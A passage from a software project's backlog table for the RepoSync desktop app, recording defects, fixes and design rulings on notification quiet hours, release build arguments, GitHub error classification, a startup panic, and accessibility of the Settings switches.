reads "RepoSync reads GitHub without signing in. GitHub allows 60 requests an hour that way, shared across all your repos.", and the value reads "not supported yet" rather than "not set", because "not set" invites the user to go and set it and there is nowhere to do that. The row was kept rather than hidden: the 60-per-hour cap is app-wide rather than per repo, so it is a real constraint on a large library and worth keeping visible until BL-V11-02 (keyring PAT) lands. The `present` branch is retained for that future rather than deleted. Also swapped `text-muted-foreground` for `text-foreground/70` on the value, matching the sibling Diagnostics card and the no-gray-on-gray rule in DESIGN.md. | Found while preparing the 2026-08-14 UX feedback pass, verified against `settings.tsx`, `github.rs`, `store.rs`, and the live database. | done 2026-08-15 |
| BL-NI-79 (Quiet hours silenced notifications without saying so) | The Settings hint read "Pause scheduled checks during a daily window (local clock)", which describes half of what the setting does. `notify::passes_gate` reuses the scheduler's `in_quiet_hours` predicate, so enabling quiet hours also suppresses tray notifications, and someone turning it on to stop overnight git activity was never told they had also muted failure alerts. Same class as BL-NI-78 and the Activity receipt footer: a control describing less than it does. **Fixed 2026-08-15** by naming both halves, plus the scheduler's actual resumption behavior ("Paused checks run when the window ends"), which is worth stating because there is no deferred queue: a repo that came due inside the window simply becomes selectable again on the first tick after it, so nothing is lost. | Found while preparing the 2026-08-14 UX feedback pass, verified against `notify.rs`, `scheduler.rs`, and `settings.tsx`. | done 2026-08-15 |
| BL-NI-80 (a cycle straddling the quiet-hours boundary drops its notifications) | `notify::passes_gate` decides against `local_minute_now()` read at FIRE time in `src-tauri/src/notify.rs`'s `fire_cycle`, not against the time the events it is judging actually occurred. The scheduler's own gate is separate and earlier: `tick_once` returns immediately if the window is open, so a cycle only exists at all when it STARTED outside the window. Those two clock readings are taken at different moments, and the gap is the whole cycle. **Consequence:** a cycle whose jobs ran outside the window but whose fire lands inside it loses every notification it produced, and loses them permanently. `coalesce` filters rather than queues, so a suppressed notification is DROPPED, not deferred. A fetch that failed at 21:59 with quiet hours starting at 22:00 is never reported, and the next cycle has nothing to re-report because the collector was drained. Same shape as BL-NI-72, where a job classified against a failure count a concurrent success had already reset: a decision made against a reading taken at a different moment than the events it governs. Narrow but recurring, since the boundary is a fixed minute-of-day and a library large enough to spend a minute in one cycle meets it daily. **CORRECTION 2026-08-21. The paragraph that stood here was WRONG, and is recorded as wrong rather than deleted, because it was written specifically to stop the next reader re-checking.** It asserted that notifications fire ONLY from the scheduler's `fire_cycle_from_collector`, and that manual actions surface through the in-app toast rather than the OS notification path. Neither holds. `commands/mod.rs` calls `notify::fire_one` from `repo_refresh_metadata`, a `#[tauri::command]` wired to the "Refresh metadata" button in the repo detail drawer (`src/components/repo-detail.tsx`), and that function's own comment names it "the manual release-notification trigger"; `passes_gate` checks quiet hours BEFORE the per-kind toggle, so that toast is suppressed inside the window (ruled acceptable, BL-NI-83). Separately, `updates.rs` raises the launch-time "update available" toast directly, through no gate at all (BL-NI-82). **The METHOD was the error, not only the answer:** the claim was built by tracing calls outward from `fire_cycle_from_collector`, which by construction cannot see a site that never calls into that module. A negative claim about call sites has to be established by searching for the CAPABILITY, and the corrected claim carries the commands that establish it: `grep -rn -e 'notification()' -e 'tauri_plugin_notification' -e 'NotificationExt' --include=*.rs crates/ src-tauri/` plus `grep -rnw -e fire_cycle -e fire_one --include=*.rs crates/ src-tauri/` (written without alternation so both stay copy-pasteable from inside a markdown table cell). What the original paragraph got RIGHT and is still true: a 3am auth failure is not swallowed, because the scheduler does not run then. **Proposed fix:** stamp the `LocalMinute` when each event is COLLECTED and gate on that, so the notification is judged by the clock that was true when the work happened; or evaluate the gate once at cycle start and carry the verdict. Either makes the two readings contemporaneous. Deferring or queueing across the window is a third option and a bigger product question. | Found 2026-08-15 while verifying an earlier and WRONG claim of mine, that quiet hours could swallow a scheduled failure notification at 3am. It cannot: the scheduler does not run then. Tracing why that was wrong surfaced the boundary case, which is real. **RESOLVED 2026-08-21: HOLD, do not drop.** Three remedies were compared and the first two rejected. (a) Stamp each event with the minute it was COLLECTED and gate on that: rejected because it only NARROWS the loss. `coalesce` filters rather than queues and the drain was unconditional, so an event stamped after the boundary is still destroyed; and the surviving toasts still raise at cycle end, INSIDE the window, so it does not protect the quiet period either. In the mixed case it is dominated by (b): identical interruption, strictly less information, permanent loss. (b) Evaluate the gate once at cycle start and carry the verdict: rejected because `run_due` already returns early when a cycle starts inside the window, so the carried verdict is ALWAYS "fire". It amounts to deleting quiet-hours suppression from the scheduled path, and would have made the BL-NI-79 copy fix false four days after it landed. (c) DEFER to the window's end: TAKEN. This row previously excluded deferral as "a bigger product question" on the assumption it needs a queue to be built. It does not. The queue already exists (`CycleNotifications`), the tick loop already calls the firing path every minute regardless of whether the cycle ran anything, and the buffer CANNOT grow while the window is open, because `run_due` returns before running any job so nothing pushes. What is held is exactly the one straddling cycle's events. Implemented by fusing the decision and the consumption into `CycleNotifications::drain_if`, which cannot be made to consume before it asks; the unconditional `drain` was REMOVED rather than left private, because the ordering-as-two-statements version passes every test either way. That was verified rather than assumed: relocating the drain back before the gate was caught by NOTHING, which is why the invariant was made structural instead of documented. The mutation is caught now, by exactly one test and no others. The same change closes a SECOND permanent-loss path found on the way: the old code drained BEFORE reading settings, so a transient settings-read failure destroyed a cycle's notifications with nothing left to retry. **E-14 AC3 is unaffected and better served:** "no toast is raised during quiet hours" now means withheld rather than destroyed. Held events are in-memory and do not survive a restart, which is the intended trade: the failure itself persists in `last_error_code`, the activity log, and the Repos and attention surfaces, so a restart costs the alert and never the record. | done 2026-08-21 |
| BL-NI-81 (the release build passed `--profile` to the wrong parser) | `tauri build` takes its own flags, then `--`, then passes everything after that through to the runner (cargo). Its own help is explicit: "[ARGS]... Command line arguments passed to the runner. Use `--` to explicitly mark the start of the arguments". `--profile` is a CARGO flag and the tauri CLI has no such option, so `tauri build --profile dist` fails immediately with `error: unexpected argument '--profile' found` and the tip `to pass '--profile' as a value, use '-- --profile'`. `--config` is the reverse: a tauri CLI flag that must come BEFORE the separator. The computed args string was `--profile dist --config ...`, which is wrong on both counts. **This was never only a dry-run problem.** tauri-action's README describes its `args` input as "additional arguments to the current tauri build command", so the same string was appended to the same `tauri build` invocation on the REAL tag path, and the first real cut would have failed the same way in under a minute, on both platforms, after preflight had already passed. Since preflight passes and then hands off, the failure would have looked like a green gate followed by an inexplicable build error at exactly the moment nobody wants one. Fixed 2026-08-16 to `--config ... -- --profile dist` (CLI flags, separator, cargo flags). **What is proven and what is not:** the DIRECT form is verified by re-dispatching the dry run; the tag form cannot be executed without pushing a tag, which is human-only, so it now merely uses the spelling the CLI documents rather than one empirically shown to fail. Found on the very first execution of the release pipeline in this repository's history (BL-NI-66, run `31930948351`), which is the entire argument for having built the lane. | The first release dry run, 2026-08-16. The workflow already carried a comment flagging "confirm how args are threaded (tauri CLI vs cargo passthrough) ... before relying on this for a real cut"; the dry run is what turned that known unknown into an answer. | done 2026-08-16 |
| BL-NI-82 (the launch-time update toast passes through no notification gate) | `updates.rs`'s `notify_update_available` calls `app.notification().builder()...show()` DIRECTLY, reached from `run_launch_check` when the on-launch update check finds a new version. It does not go through `notify::decide`, `coalesce`, or `passes_gate`, so quiet hours does not apply to it and neither does `notify_on_release` nor `notify_on_failure`: it is the one OS toast in the app that no setting can suppress. It was invisible to every call-graph trace from `notify.rs` because it never calls into that module, which is exactly why BL-NI-80's original call-site claim missed it. **In tension with E-14 AC3 as literally written** ("No toast is raised during quiet hours"), though AC3's scope was the E-14 notification surface and the updater landed as separate work, so whether it binds here was never decided either way. **RULED 2026-08-21: leave it ungated, recorded as a decision rather than inherited as an oversight.** It differs from a failure toast in the way that matters: update availability is DURABLE state that stays visible in Settings -> Updates, so suppressing the toast withholds an alert about something the user can still go and find, whereas suppressing a cycle's failure toast removes the only proactive signal that anything happened. Launch is also user-adjacent. **Revisit if** autostart-at-login (BL-NI-18) makes a quiet-window launch common enough to become a real annoyance, or when BL-NI-17's notification-policy work gives the app a coherent place to express a rule like this. Fixing it is a three-line change at the call site; the reason it is not being made now is that no ruling exists on whether it should be suppressed or deferred, and inventing one inside a scheduler fix would be the same unasked decision the BL-NI-80 work was careful to avoid. | Found 2026-08-21 by the capability grep that corrected BL-NI-80's call-site claim. | open (ruled: no change; revisit conditions recorded) |
| BL-NI-83 (quiet hours suppresses the toast for a refresh the user just clicked) | `repo_refresh_metadata` is a `#[tauri::command]` wired to the "Refresh metadata" button in the repo detail drawer (`src/components/repo-detail.tsx`). When it brings in a genuinely new release it calls `notify::fire_one`, and `passes_gate` checks quiet hours BEFORE the per-kind toggle, so inside the window the toast is suppressed with no explanation: the user clicks a button and nothing happens on the notification path. **RULED 2026-08-21: no change.** E-14 AC3 is explicit and unqualified ("No toast is raised during quiet hours") and it shipped in 0.9.0. Exempting the manual path would deviate from a ratified AC in order to close a gap where the information already reaches the user by another route: the drawer re-renders with the new `latest_release_tag`, on screen, in front of someone who is by definition looking at it. The toast is redundant for an action the user is watching. Recorded rather than left implicit because the suppression reads like a bug when found in the code, and the next person to notice it should find the ruling instead of re-deriving the question. **Revisit if** BL-NI-17's notification policy introduces a general "user-initiated actions are never suppressed" rule, at which point this becomes an instance of that rule rather than an exception to AC3. | Found 2026-08-21 while correcting BL-NI-80's call-site claim; the same sweep surfaced BL-NI-82. | open (ruled: no change) |
| BL-NI-84 (a GitHub error status was reported to the user as "no network connection") | `ReqwestTransport::fetch_repo` classified 304, 404 and a rate-limited 403 explicitly, then collapsed EVERY other non-success status into `RepoFetch::NetworkLost`, which became `RefreshOutcome::NetworkLost` and then `AppError::Offline`, whose message is "no network connection". So a GitHub 500, 502, 401, or a non-rate-limited 403 told the user their network was down about a request that demonstrably completed: a round trip happened in order to receive that status. **Two things were wrong, not one.** The message, and the RETRYABILITY: `AppError::Offline` is unconditionally retryable, while `AppError::GithubApiError { status }` already carried the correct rule (it matches 500, 502, 503 and 504, so 5xx transient and 4xx terminal). A 401 was therefore retried forever, under a message blaming the user's connection. The honest classification already existed in the frozen 30-variant taxonomy and was constructed by nothing: `GithubApiError`, alongside four other dead codes (`GithubNotFound`, `NotAGithubRemote`, `Timeout`, `GitTooOld`), none of which the frontend branches on either. Same shape as BL-NI-77's "In sync" badge one layer down: the engine has the right vocabulary, the classifier collapses to a tidier wrong value, and the user gets confident misinformation. **Why it survived a green suite:** every test in the module injects `RepoFetch` values through a fake transport, so the real status-to-classification mapping had NO coverage at all. The suite exercised the mechanism directly and never asked what the production classifier produced. That is the BL-NI-65 shape again, and it is why the fix EXTRACTS a pure `classify_repo_status` rather than editing the inline chain in place. **Fixed 2026-08-22:** new `RepoFetch::ApiError { status }` and `RefreshOutcome::ApiError { status }` carry the status to the edge, which maps it to the existing `AppError::GithubApiError { status }`. The 3xx-degrades path is preserved deliberately (redirects are refused as an SSRF defence, Security R3) but now reports as an API error rather than as network loss. Mutation-verified: restoring the collapse fails 2 tests, deleting the 304 branch fails exactly 1, reverting the edge mapping fails the edge test. **Noted rather than fixed:** a malformed JSON body on a 200 also returns `NetworkLost`, which is the same overclaim in miniature; and `ReleaseFetch::Unknown` on a non-success is deliberate preserve-the-cache behavior and correct as it stands. | Found 2026-08-21 by the six-lens unestablished-claims audit (dead-vocabulary lens), then traced from the classifier through to the user-facing string and the retry rule. | done 2026-08-22 |
| BL-NI-85 (a repo added by mistake cannot be removed from the app) | `repo_remove` is a fully implemented Tauri command with a store-layer implementation, unit tests, and a tray-menu-refresh side effect wired into it. **No frontend code calls it.** There is no remove, delete, or unlink control on any screen or in any component, and the codebase has no context menus at all; `repo-detail.tsx` offers pause and resume and no removal path. Established by capability search across all 33 registered tauri-specta commands rather than by tracing from one entry point: only `repo_remove` and `repo_check_all` (BL-NI-86) have no frontend caller. The user consequence is plain: add the wrong folder and it is in the library permanently, counting toward the attention tile and taking a scheduler slot forever. **The doc half is fixed 2026-08-22.** `features-and-outcomes.md` defines its "Core done" label as "built and tested behind the IPC seam AND renders in the built GUI" and applied it to this row, asserting a UI that does not exist; it now names the gap. `feature-inventory.md` was already honest (its legend says "no GUI rendering yet"), so only the one doc overclaimed. **The product half was jp's, ruled 2026-08-28** (jp directed the wiring), and the two decisions it named were taken with it. Confirmed: yes - a two-step inline confirm in the same idiom as the group delete, with the consequence copy (history cleared irrecoverably, the folder on disk untouched) visible before the first click rather than behind it. Placement: the repo detail drawer, a Remove section at the bottom, because the ratified 2026-08-28 no-row-overflow-menu decision makes the drawer the home for per-repo actions. **Fixed 2026-08-28:** a `RemoveSection` in `repo-detail.tsx` wired to `repoRemove`; success toasts, closes the drawer, and refreshes the list; failure keeps the drawer open and reports. Deliberately NOT routed through the drawer's shared `run` helper, which refetches on success and would flash NotFound for the just-removed id. Component tests pin the two collapses that would matter: the first click never removes, and a failed removal never closes the drawer. | Found 2026-08-21 by the unestablished-claims audit. The auditor's original citation was `feature-inventory.md`, and its adversarial verifier REFUTED that citation while confirming the underlying defect, correcting it to `features-and-outcomes.md`. | done 2026-08-28 |
| BL-NI-86 (`repo_check_all` is a registered IPC command with no consumer) | The command is registered in the tauri-specta surface and generates a `repoCheckAll` TypeScript binding. Its doc comment said it was "the additive E-13 backend command behind the tray 'Check All Now' item (also callable from the frontend)", and neither half was true: the tray reaches the behavior by calling the shared `check_all_enabled()` directly in `tray.rs`, bypassing the command, and no frontend code calls `repoCheckAll`. The symbol appears only as its own definition, one doc-comment reference, and its registration. Not user-visible. It matters as the same shape as the BL-NI-80 paragraph corrected the day before: a confident comment naming a specific consumer, which a later reader trusts instead of re-checking. **Doc comment corrected 2026-08-22** to state that it wraps `check_all_enabled` and currently has no caller. **Open:** whether to wire a frontend control to it or drop the export. Dropping changes the generated bindings, so it is not a silent cleanup. | Found 2026-08-21 by the unestablished-claims audit, via a capability sweep of all 33 registered commands. | open (doc corrected; wire-or-drop needs a ruling) |
| BL-NI-87 (the app aborted on every startup: an `unreachable!` in `logging::init` that was always reachable) | `logging::init` built the shared `LogHealth`, cloned the `Arc` into `CountingWriter`, moved that writer into `tracing_appender::non_blocking` (which holds it on a worker thread for the life of the process), then called `Arc::try_unwrap` on the original to attach the queue's dropped-line counter. `try_unwrap` succeeds only at a strong count of 1, and the count is always 2, so `unwrap_or_else(|_| unreachable!("health is not shared until after this point"))` fired on every launch. Under `[profile.release] panic = "abort"` the process died with `STATUS_STACK_BUFFER_OVERRUN` (0xC0000409, fastfail subcode 7, `FAST_FAIL_FATAL_APP_EXIT`); a GUI-subsystem process has no console, so a packaged launch showed the user nothing at all, and the log file was created and then left at 0 bytes because `abort` skips the flush. **The comment asserted the opposite of the line three above it.** It was also self-defeating: `try_unwrap` could only have succeeded by severing the writer-to-diagnostics sharing that `LogHealth` exists to provide. **Why it survived 19 days of green gates:** `logging::init` has exactly one caller in the repo, `lib.rs:287`, the app's own startup, and zero tests. 354 core tests, 93 frontend tests, clippy and fmt cannot reach it; only launching the built app can. It shipped in the 2026-08-15 installer too, so the first packaged dogfood would have caught it the day it landed. Same shape as BL-NI-77 and BL-NI-84: code asserting something nobody established. **Fixed 2026-08-26:** `dropped` becomes a `OnceLock<ErrorCounter>` set through `&self` on the already-shared `Arc`, `with_dropped_counter` is deleted, and the wiring is extracted into `wire_health` so a test can reach it. Verified red-then-green: the new test reproduces the exact production panic before the fix and passes after. | Introduced 2026-08-07 in `d95d0bf` (PR #49, log-write-health). Found 2026-08-26 when the packaged app would not start; root-caused by launching via `Start-Process -RedirectStandardError`, which gives a GUI-subsystem process a real stderr handle and surfaced the panic immediately. | done 2026-08-26 |
| BL-NI-88 (no gate ever launches the built binary) | Every gate in this repo tests code without running the app: `cargo test` exercises library functions, vitest exercises components, clippy and fmt read source. Nothing starts `reposync.exe` and asserts it is still alive a few seconds later. BL-NI-87 is the cost of that: a panic on the single startup path survived 19 days and two installers because the only thing that could catch it was a human double-clicking the binary, and that task sat blocked for 9 days. A smoke gate would be cheap: launch the built exe with a scratch data directory, wait, assert the process lives, assert the log file is non-empty and contains the startup line. The non-empty log assertion matters specifically, because `panic = "abort"` skips the flush, so an empty log is what a crash looks like. **Open:** whether this runs in CI (needs a build artifact and a display-less Windows runner path) or only as a documented pre-release step. Deliberately not bundled into the BL-NI-87 fix, which is kept to the defect. | Raised 2026-08-26 out of the BL-NI-87 post-mortem. | open (needs a ruling on CI vs pre-release step) |
| BL-NI-89 (the Activity row renders a serialized debug string instead of columns) | Each Activity row's primary text is `update: mode=fetch_only, outcome=up_to_date`, a serialized struct used as the main label. DESIGN.md's named rule is explicit: "Never surface a raw internal enum (`check_only`, `pull_ff_only`) as the primary label of a choice." The row also inverts its own hierarchy: the repo name, which DESIGN.md's Two-Register Rule names FIRST in the data/identity plane, renders small, gray and right-aligned, while the enum string is the loudest element in the row. The intended shape is real columns - When, Action, Repository, Mode, Outcome, Duration - with human labels ("Fetch only", "Up to date") and the raw enum kept only as a secondary mono tag, which the same rule permits. **Partially addressed 2026-08-26:** the outcome now renders as a colored icon-plus-word chip (`OutcomeChip`), so success and failure are legible at a glance. The row STRUCTURE is untouched and is what this row tracks. **Blocked on** the row-standard decision (one shared `DataTable` with a full and a compact density), because there is no table primitive to build the columns in: Repos and Activity each hand-build their own grid, which is why they drift. Doing the columns first would produce a third hand-built grid. | Raised 2026-08-26 by the maintainer's UI review of the v0.9.0 dogfood build, then confirmed against DESIGN.md's own Don't list. | open (blocked on the row-standard decision) |
| BL-NI-90 (Settings switches have no accessible name) | `src/components/ui/switch.tsx` renders `<button role="switch" aria-checked>` whose only child is a decorative `<span>`, and `Field` renders its label in a plain `<div>` rather than a `<label>`, so nothing associates the two. A screen reader therefore announces every switch in Settings as "switch, on" with no indication of WHICH setting: Launch on login, Close button minimizes to tray, Quiet hours, Notify on new release, and Notify on failure are mutually indistinguishable. Not a regression; it has been true since those controls were built. It surfaced on 2026-08-26 when the theme toggle moved out of the topbar into Settings, because THAT control did carry an `aria-label` on its old header button and lost it in the move. **Half fixed 2026-08-26:** `Switch` now accepts an optional `aria-label` and the new theme switch passes one, so the regression is closed. The pre-existing call sites still pass none, and were deliberately left alone rather than swept into an unrelated change. **The fix is either** passing `aria-label` at each remaining call site, or better, making `Field` render a real `<label>` with `htmlFor` and giving each control an id, which fixes the association for every control type at once rather than switch by switch. The second is the right one and is why this is a row instead of five one-line edits. | Found 2026-08-26 by the accessibility lens of the adversarial review on the Bucket A UI branch. | open |
